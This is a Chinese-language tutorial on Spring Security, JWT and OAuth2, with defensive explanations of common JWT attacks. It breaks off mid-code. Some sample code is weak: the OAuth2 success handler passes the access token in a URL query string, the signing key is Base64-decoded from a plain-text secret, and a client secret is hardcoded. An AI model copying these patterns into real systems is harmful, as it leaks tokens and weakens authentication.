# 🔐 資安完整深入教學（Spring Security / OAuth2 / JWT）

---

## 🗺️ 學習路線圖

```
資安
├── 1️⃣ 資安基礎概念
│   ├── 認證 vs 授權
│   ├── OWASP Top 10 常見漏洞
│   └── 加密基礎（對稱/非對稱）
├── 2️⃣ Spring Security 核心原理
│   ├── 過濾器鏈架構
│   ├── SecurityContext
│   ├── 認證流程
│   └── 授權流程
├── 3️⃣ JWT 深入原理與實作
│   ├── JWT 結構
│   ├── 完整實作
│   └── JWT 安全問題
├── 4️⃣ OAuth2 完整教學
│   ├── 四種授權模式
│   ├── Spring Authorization Server
│   └── 第三方登入（Google / GitHub）
├── 5️⃣ SSO 單點登入
│   └── OAuth2 + JWT 實現 SSO
└── 6️⃣ 常見攻擊防禦
    ├── SQL 注入
    ├── XSS
    ├── CSRF
    └── 其他攻擊
```

---

## 1️⃣ 資安基礎概念

---

### 🔵 認證（Authentication）vs 授權（Authorization）

```
認證（Authentication）= 你是誰？
  → 驗證身份：帳號密碼、指紋、Token

授權（Authorization）= 你能做什麼？
  → 驗證權限：能不能訪問這個資源

流程：
  用戶輸入帳密
       ↓
  [認證] 你是 John？✅
       ↓
  [授權] John 能訪問 /admin？❌（沒有 ADMIN 角色）
       ↓
  返回 403 Forbidden
```

---

### 🟡 加密基礎

#### 對稱加密 vs 非對稱加密

```
對稱加密（AES、DES）：
  加密密鑰 == 解密密鑰
  明文 ──[密鑰]──→ 密文 ──[相同密鑰]──→ 明文
  優點：速度快
  缺點：密鑰傳輸不安全
  使用：儲存加密（資料庫字段加密）

非對稱加密（RSA、ECDSA）：
  公鑰（Public Key）：可以公開，用來加密 / 驗證簽名
  私鑰（Private Key）：必須保密，用來解密 / 簽名
  加密：明文 ──[公鑰]──→ 密文 ──[私鑰]──→ 明文
  簽名：數據 ──[私鑰]──→ 簽名 ──[公鑰]──→ 驗證
  優點：無需傳輸私鑰，安全
  缺點：速度慢（比對稱慢 100~1000 倍）
  使用：HTTPS 握手、JWT RS256 簽名

雜湊（Hash / 摘要）：
  單向，不可逆！
  MD5（已不安全）、SHA-256、BCrypt
  密碼儲存：
  ❌ 明文儲存  → 資料庫洩漏直接完蛋
  ❌ MD5      → 彩虹表攻擊（預計算所有可能的 Hash）
  ✅ BCrypt   → 含有 Salt（隨機鹽），每次結果不同！
```

```java
// BCrypt 密碼加密（Spring Security 內建）
@Bean
public PasswordEncoder passwordEncoder() {
    // strength = 10（工作因子，越大越慢，預設 10）
    // 每次 encode 結果都不同（內含隨機 salt）！
    return new BCryptPasswordEncoder(10);
}

// 使用
String rawPassword = "myPassword123";
String encoded = passwordEncoder.encode(rawPassword);
// 輸出：$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy

// 驗證（不能解密，只能比對！）
boolean matches = passwordEncoder.matches(rawPassword, encoded); // true

// BCrypt hash 結構：
// $2a $ 10 $ N9qo8uLOickgx2ZMRZoMye....
//  ↑版本 ↑強度 ↑salt（22字元）↑hash
// matches 時，從 encoded 中取出 salt，用相同 salt 計算，比對結果
```

---

### 🔴 HTTPS / TLS 握手原理

```
TLS 握手流程（簡化）：

Client                              Server
  │─── ClientHello ─────────────────→│
  │    （支援的加密套件、TLS版本）        │
  │←── ServerHello ──────────────────│
  │    （選定加密套件）                 │
  │←── Certificate ──────────────────│
  │    （服務器憑證：包含公鑰）          │
  │←── ServerHelloDone ──────────────│
  │                                  │
  │ 驗證憑證（CA 簽名是否合法？）        │
  │                                  │
  │─── ClientKeyExchange ───────────→│
  │    （用公鑰加密的預主密鑰）          │
  │─── ChangeCipherSpec ────────────→│
  │─── Finished ────────────────────→│
  │←── ChangeCipherSpec ─────────────│
  │←── Finished ─────────────────────│
  │════════ 加密通訊開始 ═════════════│
  │    （使用對稱密鑰，速度快）          │

關鍵點：
1. 非對稱加密用於握手（交換密鑰）
2. 對稱加密用於實際數據傳輸（速度快）
3. CA（證書頒發機構）保證公鑰真實性
```

---

## 2️⃣ Spring Security 核心原理

---

### 🔵 過濾器鏈架構（最重要！）

```
HTTP 請求進來
      ↓
┌─────────────────────────────────────────────────────────┐
│              Spring Security Filter Chain                │
│                                                         │
│  ┌───────────────────────────────────────────────────┐  │
│  │ 1. DisableEncodeUrlFilter                         │  │
│  │ 2. WebAsyncManagerIntegrationFilter               │  │
│  │ 3. SecurityContextHolderFilter          ← 核心    │  │
│  │ 4. HeaderWriterFilter                             │  │
│  │ 5. CorsFilter                                     │  │
│  │ 6. CsrfFilter                           ← CSRF    │  │
│  │ 7. LogoutFilter                                   │  │
│  │ 8. UsernamePasswordAuthenticationFilter ← 登入    │  │
│  │ 9. DefaultLoginPageGeneratingFilter               │  │
│  │ 10. BasicAuthenticationFilter                     │  │
│  │ 11. RequestCacheAwareFilter                       │  │
│  │ 12. AnonymousAuthenticationFilter       ← 匿名    │  │
│  │ 13. ExceptionTranslationFilter          ← 異常    │  │
│  │ 14. AuthorizationFilter                 ← 授權    │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
      ↓
  DispatcherServlet → Controller
```

```java
// 自定義過濾器鏈（Spring Security 6.x 新寫法）
@Configuration
@EnableWebSecurity
@EnableMethodSecurity  // 開啟方法級別授權（@PreAuthorize）
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // 1. 關閉 CSRF（前後端分離 + JWT 不需要 CSRF）
            .csrf(csrf -> csrf.disable())

            // 2. 關閉 Session（JWT 是無狀態的）
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS))

            // 3. 配置路徑權限
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/auth/**").permitAll()
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .requestMatchers(HttpMethod.GET, "/products/**")
                    .hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            )

            // 4. 加入 JWT 過濾器（在 UsernamePassword 之前）
            .addFilterBefore(jwtAuthFilter,
                UsernamePasswordAuthenticationFilter.class)

            // 5. 異常處理
            .exceptionHandling(ex -> ex
                .authenticationEntryPoint(customAuthEntryPoint)   // 401 未認證
                .accessDeniedHandler(customAccessDeniedHandler)   // 403 無權限
            );

        return http.build();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        return config.getAuthenticationManager();
    }
}
```

---

### 🟡 認證流程深度解析

```
用戶提交帳密 POST /auth/login
      ↓
UsernamePasswordAuthenticationFilter.attemptAuthentication()
      ↓
  建立 UsernamePasswordAuthenticationToken（未認證）
      ↓
AuthenticationManager.authenticate()
      ↓
ProviderManager（遍歷所有 AuthenticationProvider）
      ↓
DaoAuthenticationProvider.authenticate()
      ↓
  ① UserDetailsService.loadUserByUsername(username)
        → 從 DB 查詢用戶
        → 返回 UserDetails（包含 username、password、roles）
  ② PasswordEncoder.matches(rawPwd, encodedPwd)
        → 驗證密碼
      ↓
  認證成功 → 返回完整的 Authentication（含角色）
      ↓
SecurityContextHolder.setContext(authentication)
      ↓
successfulAuthentication() → 生成 JWT → 返回給客戶端
```

```java
// UserDetails 實作
@Data
@AllArgsConstructor
public class UserPrincipal implements UserDetails {

    private Long   id;
    private String username;
    private String password;
    private Collection<? extends GrantedAuthority> authorities;

    // 從 User 實體轉換
    public static UserPrincipal of(User user) {
        List<GrantedAuthority> authorities = user.getRoles().stream()
            .map(role -> new SimpleGrantedAuthority("ROLE_" + role.getName()))
            .collect(Collectors.toList());
        // ⚠️ hasRole("ADMIN") 自動加上 ROLE_ 前綴
        // 所以存入 authorities 時要加 ROLE_

        return new UserPrincipal(
            user.getId(),
            user.getUsername(),
            user.getPassword(),
            authorities
        );
    }

    @Override public boolean isAccountNonExpired()     { return true; }
    @Override public boolean isAccountNonLocked()      { return true; }
    @Override public boolean isCredentialsNonExpired() { return true; }
    @Override public boolean isEnabled()               { return true; }
}

// UserDetailsService 實作
@Service
@RequiredArgsConstructor
public class CustomUserDetailsService implements UserDetailsService {

    private final UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username)
            throws UsernameNotFoundException {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() ->
                new UsernameNotFoundException("用戶不存在: " + username));
        return UserPrincipal.of(user);
    }
}
```

---

### 🟠 SecurityContext 與自定義注解

```java
// SecurityContextHolder - 存放當前認證信息
Authentication auth = SecurityContextHolder
    .getContext()
    .getAuthentication();

UserPrincipal currentUser = (UserPrincipal) auth.getPrincipal();
Long userId = currentUser.getId();

// ✅ 更優雅的方式：自定義注解
// 1. 定義注解
@Target(ElementType.PARAMETER)
@Retention(RetentionPolicy.RUNTIME)
public @interface CurrentUser {}

// 2. 實作 HandlerMethodArgumentResolver
@Component
public class CurrentUserArgumentResolver
        implements HandlerMethodArgumentResolver {

    @Override
    public boolean supportsParameter(MethodParameter parameter) {
        return parameter.hasParameterAnnotation(CurrentUser.class)
            && parameter.getParameterType().equals(UserPrincipal.class);
    }

    @Override
    public Object resolveArgument(MethodParameter parameter,
            ModelAndViewContainer mavContainer,
            NativeWebRequest webRequest,
            WebDataBinderFactory binderFactory) {
        Authentication auth = SecurityContextHolder
            .getContext().getAuthentication();
        return (UserPrincipal) auth.getPrincipal();
    }
}

// 3. 在 Controller 直接使用
@GetMapping("/profile")
public UserProfile getProfile(@CurrentUser UserPrincipal user) {
    return userService.getProfile(user.getId());
}
```

---

### 🔴 授權流程（方法級別）

```java
@RestController
@RequestMapping("/orders")
public class OrderController {

    // 需要 ADMIN 角色
    @GetMapping("/all")
    @PreAuthorize("hasRole('ADMIN')")
    public List<Order> getAllOrders() { ... }

    // 需要 ADMIN 或 MANAGER 角色
    @DeleteMapping("/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'MANAGER')")
    public void deleteOrder(@PathVariable Long id) { ... }

    // SpEL 表達式：只能訪問自己的訂單（或 ADMIN）
    @GetMapping("/{id}")
    @PreAuthorize("@orderSecurity.canAccess(authentication, #id)")
    public Order getOrder(@PathVariable Long id) { ... }

    // 需要特定權限（不是角色）
    @PostMapping
    @PreAuthorize("hasAuthority('order:create')")
    public Order createOrder(@RequestBody OrderRequest req) { ... }
}

// @PostAuthorize - 方法執行後檢查（用於返回值過濾）
@GetMapping("/{id}")
@PostAuthorize("returnObject.userId == authentication.principal.id")
public Order getOrder(@PathVariable Long id) {
    return orderService.findById(id);
}

// 自定義安全規則
@Component("orderSecurity")
public class OrderSecurityService {

    private final OrderRepository orderRepository;

    public boolean canAccess(Authentication auth, Long orderId) {
        UserPrincipal user = (UserPrincipal) auth.getPrincipal();
        // ADMIN 可以訪問所有
        if (user.getAuthorities().stream()
                .anyMatch(a -> a.getAuthority().equals("ROLE_ADMIN"))) {
            return true;
        }
        // 普通用戶只能訪問自己的
        return orderRepository.findById(orderId)
            .map(order -> order.getUserId().equals(user.getId()))
            .orElse(false);
    }
}
```

---

## 3️⃣ JWT 深入原理與實作

---

### 🔵 JWT 結構詳解

```
JWT = Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJzdWIiOiIxMjMiLCJ1c2VybmFtZSI6IkpvaG4iLCJyb2xlcyI6WyJVU0VSIl19
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

─────── Base64URL 解碼 ────────

Header（頭部）：
{
  "alg": "HS256",    ← 簽名算法（HS256 或 RS256）
  "typ": "JWT"       ← Token 類型
}

Payload（載荷）：
{
  "sub":      "123",           ← subject（用戶 ID）
  "username": "John",          ← 自定義聲明
  "roles":    ["USER"],        ← 角色
  "iat":      1700000000,      ← issued at（簽發時間）
  "exp":      1700086400       ← expiration（過期時間）
}

Signature（簽名）：
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)

JWT 驗證原理：
  ① 用 . 分割為三段
  ② 取出 header + payload
  ③ 用相同密鑰重新計算簽名
  ④ 比對計算結果與收到的 Signature
  ⑤ 相同 → 驗證通過（沒有被篡改）
  ⑥ 驗證 exp（過期時間）

⚠️ 注意：JWT 的 Payload 只是 Base64 編碼，不是加密！
  任何人都可以解碼看到內容！
  → 不要在 Payload 放敏感信息（密碼、信用卡號等）

HS256 vs RS256：
  HS256：對稱，同一個 secret 簽名和驗證 → 適合單服務
  RS256：非對稱，私鑰簽名，公鑰驗證   → 適合微服務
```

---

### 🟡 JWT 完整實作

```xml
<!-- pom.xml -->
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-api</artifactId>
    <version>0.12.3</version>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-impl</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>io.jsonwebtoken</groupId>
    <artifactId>jjwt-jackson</artifactId>
    <version>0.12.3</version>
    <scope>runtime</scope>
</dependency>
```

```yaml
# application.yml
app:
  jwt:
    secret: "your-super-secret-key-must-be-at-least-256-bits-long-for-HS256"
    access-token-expiration:  900     # 15 分鐘（秒）
    refresh-token-expiration: 604800  # 7 天（秒）
```

```java
// JWT 工具類
@Component
public class JwtTokenProvider {

    @Value("${app.jwt.secret}")
    private String jwtSecret;

    @Value("${app.jwt.access-token-expiration}")
    private long accessTokenExpiration;

    @Value("${app.jwt.refresh-token-expiration}")
    private long refreshTokenExpiration;

    private SecretKey getSigningKey() {
        byte[] keyBytes = Decoders.BASE64.decode(jwtSecret);
        return Keys.hmacShaKeyFor(keyBytes);
    }

    // ========== 生成 Token ==========

    public String generateAccessToken(UserPrincipal user) {
        return Jwts.builder()
            .subject(user.getId().toString())
            .claim("username", user.getUsername())
            .claim("roles", user.getAuthorities().stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList()))
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis()
                + accessTokenExpiration * 1000))
            .signWith(getSigningKey())
            .compact();
    }

    public String generateRefreshToken(UserPrincipal user) {
        return Jwts.builder()
            .subject(user.getId().toString())
            .claim("type", "refresh")
            .issuedAt(new Date())
            .expiration(new Date(System.currentTimeMillis()
                + refreshTokenExpiration * 1000))
            .signWith(getSigningKey())
            .compact();
    }

    // ========== 解析 Token ==========

    private Claims parseToken(String token) {
        return Jwts.parser()
            .verifyWith(getSigningKey())
            .build()
            .parseSignedClaims(token)
            .getPayload();
    }

    public Long   getUserId(String token)   { return Long.parseLong(parseToken(token).getSubject()); }
    public String getUsername(String token) { return parseToken(token).get("username", String.class); }

    @SuppressWarnings("unchecked")
    public List<String> getRoles(String token) {
        return parseToken(token).get("roles", List.class);
    }

    public boolean validateToken(String token) {
        try {
            parseToken(token);
            return true;
        } catch (ExpiredJwtException e) {
            log.warn("Token 已過期: {}", e.getMessage());
        } catch (MalformedJwtException e) {
            log.warn("Token 格式錯誤: {}", e.getMessage());
        } catch (UnsupportedJwtException e) {
            log.warn("不支援的 Token: {}", e.getMessage());
        } catch (SecurityException e) {
            log.warn("Token 簽名錯誤: {}", e.getMessage());
        } catch (IllegalArgumentException e) {
            log.warn("Token 為空: {}", e.getMessage());
        }
        return false;
    }

    public boolean isRefreshToken(String token) {
        return "refresh".equals(parseToken(token).get("type", String.class));
    }
}
```

```java
// JWT 認證過濾器
@Component
@RequiredArgsConstructor
public class JwtAuthenticationFilter extends OncePerRequestFilter {

    private final JwtTokenProvider        jwtTokenProvider;
    private final CustomUserDetailsService userDetailsService;

    @Override
    protected void doFilterInternal(HttpServletRequest  request,
                                    HttpServletResponse response,
                                    FilterChain         filterChain)
            throws ServletException, IOException {

        String token = extractToken(request);

        if (token != null && jwtTokenProvider.validateToken(token)) {
            String      username    = jwtTokenProvider.getUsername(token);
            UserDetails userDetails = userDetailsService.loadUserByUsername(username);

            UsernamePasswordAuthenticationToken authentication =
                new UsernamePasswordAuthenticationToken(
                    userDetails,
                    null,
                    userDetails.getAuthorities()
                );

            authentication.setDetails(
                new WebAuthenticationDetailsSource().buildDetails(request));

            SecurityContextHolder.getContext().setAuthentication(authentication);
        }

        filterChain.doFilter(request, response);
    }

    private String extractToken(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (StringUtils.hasText(bearerToken) && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7);
        }
        return null;
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String path = request.getRequestURI();
        return path.startsWith("/auth/") || path.startsWith("/actuator/health");
    }
}
```

```java
// Auth Controller（登入/刷新/登出）
@RestController
@RequestMapping("/auth")
@RequiredArgsConstructor
public class AuthController {

    private final AuthenticationManager authenticationManager;
    private final JwtTokenProvider      jwtTokenProvider;
    private final RefreshTokenService   refreshTokenService;

    // 登入
    @PostMapping("/login")
    public ResponseEntity<TokenResponse> login(
            @Valid @RequestBody LoginRequest request) {

        Authentication authentication = authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                request.getUsername(),
                request.getPassword()
            )
        );

        UserPrincipal user = (UserPrincipal) authentication.getPrincipal();

        String accessToken  = jwtTokenProvider.generateAccessToken(user);
        String refreshToken = jwtTokenProvider.generateRefreshToken(user);

        refreshTokenService.save(user.getId(), refreshToken);

        return ResponseEntity.ok(TokenResponse.builder()
            .accessToken(accessToken)
            .refreshToken(refreshToken)
            .tokenType("Bearer")
            .expiresIn(900L)
            .build());
    }

    // 刷新 Token
    @PostMapping("/refresh")
    public ResponseEntity<TokenResponse> refresh(
            @RequestBody RefreshRequest request) {

        String refreshToken = request.getRefreshToken();

        if (!jwtTokenProvider.validateToken(refreshToken)
                || !jwtTokenProvider.isRefreshToken(refreshToken)) {
            throw new InvalidTokenException("無效的 Refresh Token");
        }

        Long userId = jwtTokenProvider.getUserId(refreshToken);
        if (!refreshTokenService.isValid(userId, refreshToken)) {
            throw new InvalidTokenException("Refresh Token 已失效");
        }

        UserDetails   userDetails = userDetailsService.loadUserById(userId);
        UserPrincipal user        = (UserPrincipal) userDetails;
        String newAccessToken = jwtTokenProvider.generateAccessToken(user);

        return ResponseEntity.ok(TokenResponse.builder()
            .accessToken(newAccessToken)
            .refreshToken(refreshToken)
            .tokenType("Bearer")
            .expiresIn(900L)
            .build());
    }

    // 登出
    @PostMapping("/logout")
    public ResponseEntity<Void> logout(@CurrentUser UserPrincipal user) {
        refreshTokenService.delete(user.getId());
        return ResponseEntity.noContent().build();
    }
}

// Refresh Token 服務（Redis 儲存）
@Service
@RequiredArgsConstructor
public class RefreshTokenService {

    private final StringRedisTemplate redisTemplate;
    private static final String KEY_PREFIX  = "refresh_token:";
    private static final long   EXPIRE_DAYS = 7;

    public void save(Long userId, String refreshToken) {
        redisTemplate.opsForValue().set(
            KEY_PREFIX + userId, refreshToken,
            EXPIRE_DAYS, TimeUnit.DAYS
        );
    }

    public boolean isValid(Long userId, String refreshToken) {
        String stored = redisTemplate.opsForValue().get(KEY_PREFIX + userId);
        return refreshToken.equals(stored);
    }

    public void delete(Long userId) {
        redisTemplate.delete(KEY_PREFIX + userId);
    }
}
```

---

### 🔴 JWT 安全問題與防禦

```
常見 JWT 攻擊：

1. Algorithm None 攻擊（alg: none）
   攻擊者篡改 header 中的 alg 為 none → 繞過簽名驗證！
   防禦：✅ 使用嚴格的 JWT 庫，明確指定允許的算法

2. 算法混淆攻擊（RS256 → HS256）
   服務器用 RS256，攻擊者用公鑰當 HS256 的 secret 偽造
   防禦：✅ 明確指定算法，不動態信任 header 中的 alg

3. 爆破弱密鑰
   HS256 使用弱 secret → 可以暴力破解！
   防禦：✅ 使用足夠長的隨機 secret（至少 256 bits）
         ✅ 使用 RS256 非對稱加密

4. Token 洩漏（XSS 攻擊竊取 localStorage 中的 JWT）
   防禦：✅ Access Token 存 Memory（不存 localStorage）
         ✅ Refresh Token 存 HttpOnly Cookie（JS 無法讀取！）
```

```java
// ✅ Refresh Token 存 HttpOnly Cookie
@PostMapping("/login")
public ResponseEntity<TokenResponse> login(
        @Valid @RequestBody LoginRequest request,
        HttpServletResponse response) {

    // ... 認證邏輯 ...

    // Refresh Token 存 HttpOnly Cookie（JS 無法讀取）
    ResponseCookie cookie = ResponseCookie.from("refreshToken", refreshToken)
        .httpOnly(true)          // ← 防 XSS
        .secure(true)            // ← 只在 HTTPS 傳輸
        .sameSite("Strict")      // ← 防 CSRF
        .path("/auth/refresh")   // ← 只在刷新路徑發送
        .maxAge(Duration.ofDays(7))
        .build();
    response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());

    // Access Token 放 Response Body（前端存 Memory）
    return ResponseEntity.ok(TokenResponse.builder()
        .accessToken(accessToken)
        .expiresIn(900L)
        .build());
}

// 刷新時從 Cookie 讀取
@PostMapping("/refresh")
public ResponseEntity<TokenResponse> refresh(
        @CookieValue("refreshToken") String refreshToken) {
    // ... 刷新邏輯 ...
}
```

```
Token 設計最佳實踐：

Access Token：
  ✅ 短效（15 分鐘）
  ✅ 存在前端 Memory 變數（不存 localStorage）
  ✅ 頁面關閉後自動消失

Refresh Token：
  ✅ 長效（7 天）
  ✅ 存在 HttpOnly Cookie（防 XSS）
  ✅ 存在 Redis（可以主動吊銷）
  ✅ Refresh Token 輪換（每次刷新換一個新的）

Token 吊銷策略：
  ① 等待自然過期（簡單，但有延遲）
  ② Redis 黑名單（存已登出的 Token 的 jti）
  ③ 縮短 Access Token 有效期 + Refresh Token 存 Redis（推薦）
```

---

## 4️⃣ OAuth2 完整教學

---

### 🔵 OAuth2 核心概念

```
OAuth2 解決的問題：
  你想用「用 Google 帳號登入」某個網站
  但不想讓那個網站直接拿到你的 Google 密碼！

四個角色：
  Resource Owner  = 用戶（你）
  Client          = 第三方應用（你要登入的網站）
  Authorization Server = 授權服務器（Google 的登入頁面）
  Resource Server = 資源服務器（Google API，如用戶資料）
```

---

### 🟡 四種授權模式

#### 模式一：授權碼模式（Authorization Code）⭐ 最安全

```
Client           User            Auth Server      Resource Server
  │    點擊登入    │                  │                   │
  │──── 重定向到授權頁面 ────────────→│                   │
  │    GET /authorize?               │                   │
  │      client_id=xxx               │                   │
  │      redirect_uri=xxx            │                   │
  │      scope=email,profile         │                   │
  │      state=random_string ←防CSRF │                   │
  │      response_type=code          │                   │
  │                 用戶登入並授權     │                   │
  │←─── 重定向回 redirect_uri ───────│                   │
  │     ?code=AUTH_CODE              │                   │
  │     &state=random_string         │                   │
  │──── POST /token ────────────────→│                   │
  │     grant_type=authorization_code│                   │
  │     code=AUTH_CODE               │                   │
  │     client_secret=xxx ←後端私密   │                   │
  │←─── access_token + refresh_token ─│                   │
  │──── GET /userinfo ──────────────────────────────────→│
  │     Authorization: Bearer access_token               │
  │←─── 用戶資料（email, name, picture）─────────────────│
```

#### 模式二：客戶端憑證模式（Client Credentials）

```
適用：服務器間通訊（沒有用戶參與）
例：微服務 A 調用微服務 B

Client（微服務 A）        Auth Server
  │── POST /token ──────→│
  │   grant_type=client_credentials
  │   client_id=service-a
  │   client_secret=xxx
  │←── access_token ─────│
  │── 帶 Token 調用微服務 B
```

#### 模式三：隱式模式（Implicit）⚠️ 已不推薦

```
直接返回 Access Token（不經過 Code 交換）
→ Token 在 URL 中暴露，不安全！
→ 建議改用 Authorization Code + PKCE
```

#### 模式四：密碼模式（Resource Owner Password）⚠️ 不推薦

```
用戶直接把帳密給 Client，Client 再去換 Token
→ Client 知道用戶密碼，安全性差！
→ OAuth2.1 已移除此模式
```

---

### 🔴 PKCE（Proof Key for Code Exchange）⭐ 現代標準

```
問題：純前端 SPA 沒有 client_secret，Authorization Code 可能被截獲

PKCE 解決方案：

前端生成：
  code_verifier  = 隨機字串（43-128字元）
  code_challenge = BASE64URL(SHA256(code_verifier))

授權請求加入：
  code_challenge=xxxxxx
  code_challenge_method=S256

換 Token 時帶上：
  code_verifier=原始隨機字串
  → 驗證：SHA256(code_verifier) == code_challenge

即使 Authorization Code 被截獲，
攻擊者沒有 code_verifier 也無法換取 Token！
```

---

### 🟠 Spring Boot 整合 OAuth2 第三方登入

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

```yaml
# application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id:     ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope:
              - email
              - profile
          github:
            client-id:     ${GITHUB_CLIENT_ID}
            client-secret: ${GITHUB_CLIENT_SECRET}
            scope:
              - user:email
              - read:user
```

```java
// Security 配置加入 OAuth2
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .oauth2Login(oauth2 -> oauth2
            .authorizationEndpoint(auth -> auth
                .baseUri("/oauth2/authorize"))
            .redirectionEndpoint(redirect -> redirect
                .baseUri("/login/oauth2/code/*"))
            .successHandler(oAuth2AuthenticationSuccessHandler)
            .failureHandler(oAuth2AuthenticationFailureHandler)
            .userInfoEndpoint(userInfo -> userInfo
                .userService(customOAuth2UserService))
        );
    return http.build();
}

// 自定義 OAuth2 用戶服務
@Service
@RequiredArgsConstructor
public class CustomOAuth2UserService extends DefaultOAuth2UserService {

    private final UserRepository userRepository;

    @Override
    public OAuth2User loadUser(OAuth2UserRequest request)
            throws OAuth2AuthenticationException {

        OAuth2User oAuth2User = super.loadUser(request);
        String     provider   = request.getClientRegistration().getRegistrationId();

        OAuth2UserInfo userInfo = OAuth2UserInfoFactory
            .getOAuth2UserInfo(provider, oAuth2User.getAttributes());

        User user = userRepository
            .findByProviderAndProviderId(provider, userInfo.getId())
            .orElseGet(() -> registerNewUser(provider, userInfo));

        updateUser(user, userInfo);
        return UserPrincipal.of(user, oAuth2User.getAttributes());
    }

    private User registerNewUser(String provider, OAuth2UserInfo info) {
        User user = User.builder()
            .provider(provider)
            .providerId(info.getId())
            .name(info.getName())
            .email(info.getEmail())
            .imageUrl(info.getImageUrl())
            .role(Role.USER)
            .build();
        return userRepository.save(user);
    }
}

// 不同 Provider 的用戶資料格式不同，用工廠模式統一
public abstract class OAuth2UserInfo {
    protected Map<String, Object> attributes;
    public abstract String getId();
    public abstract String getName();
    public abstract String getEmail();
    public abstract String getImageUrl();
}

public class GoogleOAuth2UserInfo extends OAuth2UserInfo {
    @Override public String getId()       { return (String) attributes.get("sub"); }
    @Override public String getName()     { return (String) attributes.get("name"); }
    @Override public String getEmail()    { return (String) attributes.get("email"); }
    @Override public String getImageUrl() { return (String) attributes.get("picture"); }
}

public class GithubOAuth2UserInfo extends OAuth2UserInfo {
    @Override public String getId()       { return String.valueOf(attributes.get("id")); }
    @Override public String getName()     { return (String) attributes.get("login"); }
    @Override public String getEmail()    { return (String) attributes.get("email"); }
    @Override public String getImageUrl() { return (String) attributes.get("avatar_url"); }
}

// OAuth2 登入成功後：生成 JWT 返回給前端
@Component
@RequiredArgsConstructor
public class OAuth2AuthenticationSuccessHandler
        extends SimpleUrlAuthenticationSuccessHandler {

    private final JwtTokenProvider    jwtTokenProvider;
    private final RefreshTokenService refreshTokenService;

    @Override
    public void onAuthenticationSuccess(HttpServletRequest  request,
                                         HttpServletResponse response,
                                         Authentication      authentication)
            throws IOException {

        UserPrincipal user = (UserPrincipal) authentication.getPrincipal();

        String accessToken  = jwtTokenProvider.generateAccessToken(user);
        String refreshToken = jwtTokenProvider.generateRefreshToken(user);
        refreshTokenService.save(user.getId(), refreshToken);

        String targetUrl = UriComponentsBuilder
            .fromUriString("http://localhost:3000/oauth2/callback")
            .queryParam("token", accessToken)
            .build().toUriString();

        getRedirectStrategy().sendRedirect(request, response, targetUrl);
    }
}
```

---

## 5️⃣ SSO 單點登入（Single Sign-On）

---

### 🔵 SSO 架構設計

```
SSO 目標：用戶只登入一次，可以訪問多個系統

                    ┌──────────────────────────┐
                    │    Authorization Server   │
                    │   （統一認證中心）           │
                    │   Spring Authorization    │
                    │        Server             │
                    └──────────┬───────────────┘
                               │ 簽發 Token
              ┌────────────────┼────────────────┐
              ↓                ↓                ↓
        ┌──────────┐    ┌──────────┐    ┌──────────┐
        │  訂單系統  │    │  用戶系統  │    │  商品系統  │
        │ Resource │    │ Resource │    │ Resource │
        │  Server  │    │  Server  │    │  Server  │
        └──────────┘    └──────────┘    └──────────┘

用戶只需在 Authorization Server 登入一次
各 Resource Server 用公鑰驗證 JWT（不需要請求 Auth Server）
```

---

### 🟡 Spring Authorization Server 實作

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-authorization-server</artifactId>
</dependency>
```

```java
// Authorization Server 配置
@Configuration
public class AuthorizationServerConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain authServerSecurityFilterChain(
            HttpSecurity http) throws Exception {

        OAuth2AuthorizationServerConfiguration.applyDefaultSecurity(http);
        http.getConfigurer(OAuth2AuthorizationServerConfigurer.class)
            .oidc(Customizer.withDefaults());

        return http
            .exceptionHandling(e -> e
                .authenticationEntryPoint(
                    new LoginUrlAuthenticationEntryPoint("/login")))
            .oauth2ResourceServer(rs -> rs.jwt(Customizer.withDefaults()))
            .build();
    }

    @Bean
    @Order(2)
    public SecurityFilterChain defaultSecurityFilterChain(
            HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults());
        return http.build();
    }

    // 已註冊的客戶端
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient orderClient = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("order-service")
            .clientSecret("{bcrypt}" + new BCryptPasswordEncoder()
                .encode("order-secret"))
            .clientAuthenticationMethod(
                ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
